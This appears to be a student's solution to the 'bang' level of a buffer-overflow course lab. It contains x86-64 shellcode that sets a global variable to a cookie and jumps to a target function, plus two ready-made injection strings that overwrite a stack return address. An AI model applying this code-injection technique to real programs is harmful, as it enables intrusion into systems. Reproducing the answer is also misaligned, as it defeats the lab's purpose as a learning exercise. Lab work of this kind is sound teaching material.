# global_value address: 0x602308
# cookie address: 0x602320
# bang function address: 0x401020

# instructions to set global_value to cookie and run bang
_start:
movq $0x602308, %r12
movq $0x287a7d67, (%r12)
movq $0x30b72b30, 4(%r12)
push $0x401020
retq

# disassembly of above code:
# 0000000000000000 <_start>:
#   0:	49 c7 c4 08 23 60 00 	mov    $0x602308,%r12
#   7:	49 c7 04 24 67 7d 7a 	movq   $0x287a7d67,(%r12)
#   e:	28 
#   f:	49 c7 44 24 04 30 2b 	movq   $0x30b72b30,0x4(%r12)
#  16:	b7 30 
#  18:	68 20 10 40 00       	pushq  $0x401020
#  1d:	c3                   	retq

# binary code:
# 49 c7 c4 08 23 60 00 49 c7 04 24 67 7d 7a 28 49 c7 44 24 04 30 2b b7 30 68 20 10 40 00 c3

# input string (bang.txt):
# 49 c7 c4 08 23 60 00 49 c7 04 24 67 7d 7a 28 49 c7 44 24 04 30 2b b7 30 68 20 10 40 00 c3 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 00 bc ff ff ff 7f 00 00

# alternative input string (exploit code placed after padding code):
# 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 40 bc ff ff ff 7f 00 00 49 c7 c4 08 23 60 00 49 c7 04 24 67 7d 7a 28 49 c7 44 24 04 30 2b b7 30 68 20 10 40 00 c3
